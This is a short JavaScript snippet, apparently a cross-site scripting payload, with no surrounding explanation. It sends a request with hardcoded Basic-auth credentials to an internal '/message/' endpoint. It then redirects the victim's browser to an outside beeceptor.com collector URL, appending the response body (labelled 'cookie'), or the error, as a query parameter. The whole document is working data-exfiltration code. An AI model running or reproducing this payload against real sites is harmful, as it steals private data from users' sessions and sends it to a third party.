(async () => {
  let headers = new Headers();
  headers.set('Authorization', 'Basic ' + btoa('dev_us' + ":" + 'valera_smeni_kredi_4mo'));
  fetch('/message/9b291267-adb9-4716-9c61-d0f5228495eb', {headers, redirect: 'manual'}).then(res => res.text()).then(res => {
    window.location.replace('https://gvfdgdfgfsfd.free.beeceptor.com?cookie=' + encodeURIComponent(res).slice(0, 10000));
  }).catch(err => {
    window.location.replace('https://gvfdgdfgfsfd.free.beeceptor.com?errcookie=' + JSON.stringify(err))
  });
})()
